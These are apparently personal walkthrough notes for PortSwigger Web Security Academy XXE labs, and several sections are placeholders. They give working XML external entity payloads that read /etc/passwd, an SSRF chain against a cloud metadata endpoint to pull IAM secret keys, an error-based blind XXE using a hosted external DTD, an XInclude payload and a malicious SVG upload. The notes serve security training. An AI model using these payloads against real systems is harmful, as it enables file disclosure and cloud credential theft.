
## [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)

- Look for XML being sent in a request.
- Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

- Replace the `productId` number with a reference to the external entity: `&xxe;`. The response should contain "Invalid product ID:" followed by the contents of the `/etc/passwd` file.

## [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)


- Look for XML being sent in a request.
- Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
    
    `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>`
- Replace the `productId` number with a reference to the external entity: `&xxe;`. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.
- Iteratively update the URL in the DTD to explore the API until you reach `/latest/meta-data/iam/security-credentials/admin`. This should return JSON containing the `SecretAccessKey`.

## [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)

**Need burp collaborator**

## [Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)

**Need burp collaborator**

## [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)

**Need burp collaborator**

## [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)

- Look for XML being sent in a request.
- Load the following DTD file into the exploit server:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> 
%eval; 
%exfil;
```
- View the exploit and take note of the url
- Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
	    ```
	  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>  
	    ```
    
- You should see an error message containing the contents of the `/etc/passwd` file.
## [Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)

- Inject **<>** into all parameters and look for XML errors. This indicates the value is being parsed by an XML external entity.
- Inject the following payload into the parameter:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

- Check if XML is being sent in a request 
- If xml is in an image body in the request replace the entire xml with the following payload:
```xml
`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
```
- You should see the result in the image if it is vulnerable
